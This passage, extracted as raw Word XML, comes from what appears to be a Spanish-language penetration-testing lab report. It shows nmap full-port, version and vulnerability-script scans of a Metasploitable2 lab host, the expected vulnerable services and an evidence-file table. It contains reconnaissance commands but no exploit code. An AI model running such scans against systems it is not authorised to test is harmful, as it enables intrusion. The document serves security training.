          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -O -p- --min-rate 1000 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700EDCE6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="053D4D48" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Genera tres archivos de salida</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (texto), </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>xml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (XML)</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>gnmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (grep-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>able</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCA8206" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Resumen de puertos abiertos</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Extrae y lista solo los puertos en estado </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EAE2DE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>grep "/open/" full-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>scan.gnmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> | tr ',' '\n' | grep "/open/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480E2B73" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62A5BB95" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Scripts NSE de vulnerabilidades</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Lanza los scripts del módulo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>vuln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1A370C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> --script </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>vuln</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BE7AC4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3178558B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Resultado esperado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70769301" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Metasploitable2 expone ~30 puertos. Los más relevantes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF28195" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>21/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>open  ftp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.3.4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6561DA1D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>22/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open  ssh</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">       OpenSSH 4.7p1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F97215" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>23/tcp   open  telnet    Linux telnetd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9A90E0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>25/tcp   open  smtp      Postfix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB4EE51" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>80/tcp   open  http      Apache/2.2.8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11276688" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>139/tcp  open  netbios   Samba smbd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F951F5D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>445/tcp  open  microsoft Samba smbd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E0EFDB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>3306/tcp open  mysql     MySQL 5.0.51a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5E5974" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>5432/tcp open  postgresql PostgreSQL 8.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049AC07D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FD72CF0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Evidencia generada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7C2578" w14:paraId="255B58C4" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="3CE3CF80" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="0A9C32F3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="7DC28865" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C690B6E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>full-scan.nmap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24E84597" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Salida completa del escaneo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="32BAFCE6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="2AF78307" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>full-scan.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="746A7297" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve">Salida XML (importable en </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Metasploit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="330AC85A" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A84C8B7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open-ports.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6314E10E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Lista limpia de puertos abiertos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="7E58F554" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="3FB4FE9C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>vuln-scripts.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="1D987F51" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Vulnerabilidades detectadas por NSE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="35C88C7B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="3068F3A9" w14:textId="5E2B28FA" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38CFD810" wp14:editId="3FE125C0">
            <wp:extent cx="5972810" cy="4458970"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="7895762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5762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45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212FD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="555F589D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>6. Fase 3 — Enumeración HTTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D75DAB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
